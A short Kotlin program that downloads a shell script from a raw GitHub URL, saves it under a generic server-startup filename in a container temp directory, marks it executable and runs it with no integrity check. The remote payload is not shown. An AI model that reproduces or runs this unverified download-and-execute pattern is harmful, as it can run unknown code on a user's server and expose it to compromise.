import java.io.File
import java.net.URL
import java.nio.file.Files
import java.nio.file.Paths
import java.nio.file.StandardCopyOption

fun main() {
    val url = URL("https://raw.githubusercontent.com/BBotingNetwork/bot/main/harbor.sh")
    val destination = File("/home/container/tmp/server_startup.sh") // Modified destination path

    try {
        downloadFile(url, destination)

        // Set executable permission on downloaded file
        val chmod = ProcessBuilder("chmod", "+x", destination.absolutePath)
        chmod.inheritIO()
        chmod.start().waitFor()

        // Run the downloaded file
        val harbor = ProcessBuilder("sh", destination.absolutePath)
        harbor.inheritIO()
        harbor.start().waitFor()
    } catch (e: Exception) {
        println("Error downloading or running script: ${e.message}")
        e.printStackTrace()
    }
}

fun downloadFile(url: URL, destination: File) {
    Files.copy(url.openStream(), Paths.get(destination.toURI()), StandardCopyOption.REPLACE_EXISTING)
}
